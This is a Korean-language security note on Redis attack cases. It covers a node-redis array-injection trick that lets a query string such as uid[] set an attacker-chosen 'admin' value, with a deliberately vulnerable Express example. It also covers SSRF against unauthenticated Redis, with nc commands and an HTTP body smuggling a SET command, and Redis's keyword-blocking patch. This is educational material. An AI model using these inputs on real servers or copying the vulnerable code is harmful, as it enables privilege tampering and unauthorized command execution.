Redis - Bug Case :
    
1) node-Redis 모듈 :
    밑은 NodeJS에서 Redis를 사용하는 코드입니다.

    req.query에 해당하는 부분은 문자열 타입외에도 array, object 타입도 넣을 수 있습니다.

    NodeJS에서 많이 사용되는 redis 모듈에서는 command에 array타입이 입력 될 경우 아래와 같이 동작합니다. 
    req.query에 들어가는 값이 문자열 타입이 아닌 array 타입도 입력할 수 있기 때문에 아래 코드의 흐름이 동작되게 할 수 있습니다.
    ex)
        // https://github.com/NodeRedis/node-redis/blob/0041e3e53d5292b13d96ce076653c5b91b314fda/lib/commands.js#L20-L25
        if (Array.isArray(arguments[0])) {
            arr = arguments[0];
            if (len === 2) {
                callback = arguments[1];
            }
        }

    command의 첫번째 인자에 array 타입이 올 경우 기존 방식과는 다른 방식으로 처리됩니다.
    ex)
        // String Type
        key, value, callback => Command(command, [key, value], callback) 
        
        // Array Type
        [key, value] => Command(command, key, value)

    즉, 개발 시 의도된 value로 값이 설정되지 않고 임의의 값을 value를 사용할 수 있습니다.

    http://localhost:3000/init?uid[]=test&uid[]={"level":"admin"}와 같이 array 타입 입력 시,
    실제로 Redis에 요청하는 명령어는 Command("set", "test", '{"level":"admin"}')와 같은 명령어가 실행되어 원하는 Value를 가진 데이터를 생성할 수 있습니다.

    ex)
        var express = require('express');
        var app = express();
        app.use(express.json());
        app.use(express.urlencoded( {extended : false } ));
        
        const redis = require("redis");
        const client = redis.createClient();
        
        app.get('/init', function(req,res) {
            // client.set("key", "value");
            client.set(req.query.uid, JSON.stringify({level: 'guest'}));
            res.send('ok')
        });
        
        var server = app.listen(3000, function(){
            console.log('app.listen');
        });

        Line 11: redis에 사용자가 입력하는 uid 값을 key로 {level: 'geust'} 값을 value로 저장합니다.

2) SSRF (Server-Side Request Forgery) :
    Redis는 기본적으로 인증 체계가 존재하지 않으며, bind 127.0.0.1로 서비스되어 집니다.
    그렇기 때문에 직접 접근하여 인증 과정없이 명령어를 실행할 수 있습니다.
    ex)
        $ echo -e 'info\r\n' | nc 127.0.0.1 6379
        $2728
        # Server
        redis_version:4.0.9
        redis_git_sha1:00000000
        redis_git_dirty:0
        redis_build_id:9435c3c2879311f3
        redis_mode:standalone
        os:Linux 5.0.0-27-generic x86_64
        arch_bits:64
        multiplexing_api:epoll
        atomicvar_api:atomic-builtin
        gcc_version:7.4.0
        process_id:13438
        run_id:61725671377fa0ba43547443df3097b0346b9bab
        tcp_port:6379
        ...

    위와 같은 이유로 인해 악의적인 공격자는 SSRF 취약점을 이용하여 Redis에 명령어를 실행 시킬 수 있습니다.

    Redis에서는 이전 명령어가 유효하지 않은 명령어가 입력되어도 연결이 끊어지지 않고 다음 유효한 명령어를 처리합니다.
    아래와 같이 첫번째 줄은 유효한 명령어가 아니지만, 두번째 줄의 명령어는 성공적으로 실행된 것을 확인할 수 있습니다.
    ex)
        $ echo -e "anydata: anydata\r\nget hello" | nc 127.0.0.1 6379
        -ERR unknown command 'anydata:'
        $5
        world

    이에 따라 위와 같은 Redis의 처리 구조를 이용한 SSRF공격 방법이 연구되었습니다.

    그 중 대표적으로 HTTP 프로토콜을 이용한 공격 방법이 있습니다.
    아래와 같이 HTTP의 Body부분에 원하는 명령어를 포함시켜 공격하는 방법이 있습니다.
    ex)
        POST / HTTP/1.1
        host: 127.0.0.1:6379
        user-agent: Mozilla/5.0...
        content-type: application/x-www-form-urlencoded
        
        data=a
        SET key value
        ...

    Redis는 HTTP 프로토콜을 이용한 SSRF를 방어하기 위해 HTTP의 주요 키워드가 명령어로 입력되면
    해당 연결을 끊어버리는 방식을 통해 HTTP 프로토콜을 이용한 SSRF를 방어하였습니다.
    (https://github.com/antirez/redis/commit/a81a92ca2ceba364f4bb51efde9284d939e7ff47)
    ex)
        $ echo -e "post a\r\nget hello" | nc 127.0.0.1 6379
        $ echo -e "host: a\r\nget hello" | nc 127.0.0.1 6379
        
        # 12235:M 01 May 09:59:57.614 # Possible SECURITY ATTACK detected. 
        It looks like somebody is sending POST or Host: commands to Redis. 
        This is likely due to an attacker attempting to use Cross Protocol Scripting to compromise your Redis instance. 
        Connection aborted.

    위와 같이 post 또는 host 키워드가 포함될 경우 securityWarningCommand로 인식하여
    클라이언트와의 연결을 끊어버려 다음 명령어가 실행되지 않게 패치되었습니다.

    그러나 HTTP 프로토콜을 제외한 다른 프로토콜을 이용한 공격 방법에는 취약할 수 밖에 없습니다.
























